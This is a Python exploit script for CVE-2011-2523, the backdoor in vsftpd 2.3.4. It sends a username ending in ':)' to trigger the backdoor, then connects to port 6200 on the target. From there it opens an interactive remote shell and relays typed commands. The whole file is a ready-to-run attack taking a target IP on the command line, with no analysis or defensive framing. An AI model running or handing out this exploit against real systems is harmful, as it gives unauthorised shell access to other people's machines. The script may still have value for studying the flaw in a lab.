#CVE-2011-2523
#vsftpd v2.3.4 exploit

import socket
import sys
import os

def exploit(target_ip, target_port=21):
    try:
        print("[*] Connecting to the target...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))

        response = s.recv(1024).decode()
        print("[*] Received:", response.strip())

        if "vsFTPd 2.3.4" in response:
            print("[*] Sending malicious payload...")
            s.send(b'USER backdoor:) \r\n')
            s.send(b'PASS anything \r\n')

            # The backdoor opens a shell on port 6200
            s.close()

            print("[*] Connecting to the backdoor shell...")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, 6200))

            print("[*] Shell is open. Type your commands.")
            while True:
                command = input("$ ")
                if command.lower() in ['exit', 'quit']:
                    break

                s.send((command + "\n").encode())
                response = s.recv(4096).decode()
                print(response)

            s.close()
        else:
            print("[!] Target does not appear to be vulnerable.")
            s.close()

    except Exception as e:
        print(f"[!] An error occurred: {e}")
        sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_ip> [target_port]")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 21

    exploit(target_ip, target_port)
